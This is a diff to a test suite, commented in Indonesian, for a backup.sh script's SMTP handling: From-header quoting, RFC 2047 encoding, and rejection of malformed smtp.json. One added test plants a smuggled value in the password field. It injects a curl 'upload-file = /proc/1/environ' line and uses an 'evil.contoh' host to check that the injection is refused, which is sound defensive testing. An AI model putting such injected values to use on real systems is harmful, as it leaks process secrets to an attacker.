@@ -330,7 +330,7 @@ describe("backup.sh: kasus tepi (review T-7psf)", () => {
 
 describe("backup.sh: SMTP dari Admin › Email (T-byys)", () => {
   const PW = 'dummy:pa"ss\\word#@1';
-  function smtpJson(security: string) {
+  function smtpJson(security: string, over: Record<string, unknown> = {}) {
     mkdirSync(join(cfg(), "app"), { recursive: true });
     writeFileSync(
       join(cfg(), "app/smtp.json"),
@@ -342,6 +342,7 @@ describe("backup.sh: SMTP dari Admin › Email (T-byys)", () => {
         password: PW,
         fromAddress: "noreply@contoh.id",
         fromName: "Data Dashboard",
+        ...over,
       }),
     );
   }
@@ -359,7 +360,7 @@ describe("backup.sh: SMTP dari Admin › Email (T-byys)", () => {
     const args = readFileSync(join(root, "curl-args-0.txt"), "utf8");
     expect(args).toContain("--mail-from noreply@contoh.id");
     expect(args).not.toContain("dummy:pa");
-    expect(mails()[0]).toContain("From: Data Dashboard <noreply@contoh.id>");
+    expect(mails()[0]).toContain('From: "Data Dashboard" <noreply@contoh.id>');
   });
 
   it("STARTTLS → ssl-reqd; tanpa smtp.json → SMTP_URL lama dengan STARTTLS oportunistik", () => {
@@ -378,5 +379,27 @@ describe("backup.sh: SMTP dari Admin › Email (T-byys)", () => {
     expect(conf2).toContain('url = "smtps://bot%40pcpexpress.com:smtp-pw@mail.pcpexpress.com:465"');
     expect(conf2).toMatch(/^ssl$/m);
     expect(mails()[1]).toContain("From: Data Dashboard <bot@pcpexpress.com>");
+  });
+
+  it("injeksi baris baru di smtp.json (app dibobol) → ditolak, tanpa baris konfigurasi curl tambahan", () => {
+    smtpJson("ssl", { password: "x\nupload-file = /proc/1/environ\n#", host: "evil.contoh" });
+    enableTarget();
+    writeFileSync(join(root, "down"), "");
+    const r = run();
+    expect(r.code, r.out).toBe(0);
+    expect(r.out).toContain("smtp.json tidak valid");
+    const conf = readFileSync(join(root, "smtp-config-0.txt"), "utf8");
+    expect(conf).not.toContain("upload-file");
+    expect(conf).not.toContain("evil.contoh");
+    expect(conf).toContain("mail.pcpexpress.com:465");
+  });
+
+  it("nama pengirim berkoma/non-ASCII → encoded-word RFC 2047", () => {
+    smtpJson("ssl", { fromName: "PCP Express, Dasbor — Data" });
+    enableTarget();
+    writeFileSync(join(root, "down"), "");
+    expect(run().code).toBe(0);
+    const b64 = Buffer.from("PCP Express, Dasbor — Data").toString("base64");
+    expect(mails()[0]).toContain(`From: =?UTF-8?B?${b64}?= <noreply@contoh.id>`);
   });
 });
